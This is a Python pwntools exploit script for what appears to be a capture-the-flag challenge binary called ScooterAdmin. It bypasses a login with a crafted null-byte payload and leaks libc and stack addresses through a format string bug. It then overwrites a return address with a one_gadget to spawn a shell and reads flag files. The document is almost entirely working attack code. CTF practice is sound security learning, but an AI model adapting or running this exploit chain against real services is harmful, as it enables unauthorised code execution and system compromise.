#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./ScooterAdmin"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		#b *check_auth+380
		#b *fetchfile+261
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def fetchfile(buf):
    p.sendlineafter(':', '3')
    p.sendlineafter(':', buf)
    p.recvuntil("for: ")
    return p.recvline().rstrip()

# Login (exp1.py)
payload = b'\0' * 8# input
payload += b'A' * 8 * 3# buf
payload += b'\0' * 0x8 * 3# creds

p.recvuntil(":")
p.send(payload)

# leak libc address with FSB
payload = b"%785$p"

leak = eval(fetchfile(payload))# __vfprintf_internal+0x11d
log.info("leak: " + hex(leak))
libc_base = leak - libc.symbols["__vfprintf_internal"] - 0x11d
log.info("libc base: " + hex(libc_base))

# overwrite return address
payload = b"%780$p"
leak = eval(fetchfile(payload))
log.info("leak: " + hex(leak))
ret_addr_at = leak + 0x2298
log.info("ret address@stack: " + hex(ret_addr_at))

one_gadget_offset = 0x50a37
one_gadget = libc_base + one_gadget_offset

writes = {
        ret_addr_at: one_gadget
        }

payload = fmtstr_payload(6, writes)
fetchfile(payload)

# spawn shell
p.sendlineafter(':', '5')
p.sendline("cat flag2.txt")
p.sendline("cat flag3.txt")

p.interactive()
